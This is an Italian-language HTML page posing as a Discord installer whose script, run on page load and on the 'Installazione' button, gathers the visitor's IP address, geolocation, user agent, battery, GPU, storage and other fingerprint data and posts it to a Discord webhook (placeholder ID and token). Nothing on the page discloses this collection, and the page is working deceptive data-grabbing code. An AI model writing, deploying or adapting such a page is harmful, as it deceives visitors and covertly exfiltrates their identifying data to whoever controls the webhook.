<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <h1>Installazione di Discord sotto</h1>
    <button onclick="sendDeviceInfo();">
        Installazione
    </button>
</head>
<body>

    <script>
        async function sendDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                online: navigator.onLine,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null,
                battery: null,
                ipAddress: null,
                webGLRenderer: null,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                location: null,
                hardwareConcurrency: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory || 'N/A',
                storageEstimate: null,
                doNotTrack: navigator.doNotTrack
            };

            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                deviceInfo.battery = {
                    charging: battery.charging,
                    level: (battery.level * 100).toFixed(2) + '%',
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }

            await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    deviceInfo.ipAddress = data.ip;
                });

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    deviceInfo.location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                });
            }

            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    deviceInfo.webGLRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }

            if (navigator.storage && navigator.storage.estimate) {
                const estimate = await navigator.storage.estimate();
                deviceInfo.storageEstimate = {
                    quota: (estimate.quota / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
                    usage: (estimate.usage / (1024 * 1024 * 1024)).toFixed(2) + ' GB'
                };
            }

            const payload = {
                embeds: [{
                    title: "Informazioni del Dispositivo",
                    description: "Ecco alcune informazioni del tuo dispositivo:",
                    color: 0x0099ff, // Blu chiaro
                    fields: [
                        { name: 'User Agent', value: deviceInfo.userAgent || 'N/A', inline: true },
                        { name: 'Piattaforma', value: deviceInfo.platform || 'N/A', inline: true },
                        { name: 'Lingua', value: deviceInfo.language || 'N/A', inline: true },
                        { name: 'Risoluzione dello Schermo', value: deviceInfo.screenResolution || 'N/A', inline: true },
                        { name: 'Profondit√† Colori', value: deviceInfo.colorDepth || 'N/A', inline: true },
                        { name: 'Stato Connessione', value: deviceInfo.online ? 'Online' : 'Offline', inline: true },
                        { name: 'Batteria', value: deviceInfo.battery ? `Livello: ${deviceInfo.battery.level}` : 'N/A', inline: true },
                        { name: 'Fuso Orario', value: deviceInfo.timeZone || 'N/A', inline: true },
                        { name: 'Memoria', value: deviceInfo.memory || 'N/A', inline: true }
                    ],
                    footer: {
                        text: "Messaggio inviato tramite webhook",
                        icon_url: "https://i.imgur.com/AfFp7pu.png" // Icona del footer
                    }
                }]
            };

            const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('Informazioni del dispositivo inviate con successo.');
                } else {
                    console.error('Errore nell\'invio delle informazioni:', response.status, response.statusText);
                }
            } catch (error) {
                console.error('Errore:', error);
            }
        }

        window.onload = sendDeviceInfo;
    </script>

</body>
</html>
